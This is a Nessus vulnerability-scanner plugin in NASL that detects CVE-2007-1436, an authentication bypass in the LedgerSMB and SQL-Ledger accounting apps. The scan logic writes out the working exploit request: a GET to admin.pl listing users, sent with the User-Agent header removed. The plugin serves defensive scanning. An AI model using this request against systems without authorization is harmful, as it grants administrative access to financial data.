#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24784);
  script_version("$Revision: 1.19 $");

  script_cve_id("CVE-2007-1436");
  script_bugtraq_id(22889);
  script_osvdb_id(33622, 33623);

  script_name(english:"LedgerSMB / SQL-Ledger admin.pl Admin Authentication Bypass");
  script_summary(english:"Tries to bypass authentication in LedgerSMB/SQL-Ledger");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Perl application that is prone to an
authentication bypass attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running LedgerSMB or SQL-Ledger, a web-based
double-entry accounting system. 

The version of LedgerSMB or SQL-Ledger on the remote host contains a
design flaw that can be leveraged by a remote attacker to bypass
authentication and gain administrative access of the application." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2007/Mar/147" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?836a2146" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?32a9e60d" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to LedgerSMB 1.1.9 / SQL-Ledger 2.6.26 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/03/09");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/03/09");
 script_cvs_date("$Date: 2016/10/27 15:03:54 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);

if (thorough_tests) dirs = list_uniq(make_list("/ledger", "/sql-ledger", "/ledger-smb", "/ledgersmb", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Bypass authentication and list users.
  rq = http_mk_get_req(
    item:string(
      dir, "/admin.pl?",
      "path=bin/mozilla&",
      "action=list_users"
    ), 
    port:port
  );
  # nb: exploit requires that there not be a User-Agent header.
  rq['X-User-Agent'] =  rq['User-Agent'];
  rq['User-Agent'] = NULL;
  w = http_send_recv_req(port: port, req: rq);
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if it looks like we got the list of users.
  #
  # nb: this won't necessarily work if the language is not English.
  if (
    "Database Administration" >< res && 
    (
      # SQL-Ledger
      'name=action value="Logout"' >< res ||
      # LedgerSMB
      'name="action" value="Logout"' >< res
    )
  )
  {
    security_hole(port);
    exit(0);
  }
}
